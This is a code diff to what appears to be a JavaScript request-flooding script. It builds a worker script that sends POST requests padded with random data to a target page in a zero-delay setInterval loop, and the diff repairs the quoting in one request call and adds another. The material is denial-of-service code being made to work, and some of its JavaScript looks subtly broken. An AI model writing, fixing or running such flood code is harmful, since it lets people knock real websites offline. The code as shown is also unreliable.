@@ -92,7 +92,7 @@ var background =
 +"      x.send(\"?var=\"+data);\n"
 +"     }\n"
 +"  };\n"
-+"  x.open("\POST\", \"+"page"+", true);\n";
++"  x.open("\POST\", \""+page+"\", true);\n";
 +"  x.send(\"?var=\"+data);\n"
 +"  setInterval(function(){\n"
 +"    x.send(\"?q=\"+data);\n"
@@ -134,5 +134,6 @@ else
   var data;
   while(data.length < datalength)
     data+=charset[Math.floor(Math.random()*62)];
+  x.open("POST", page, true);
   setInterval(function(){x.send("q="+data);}, 0);
 }
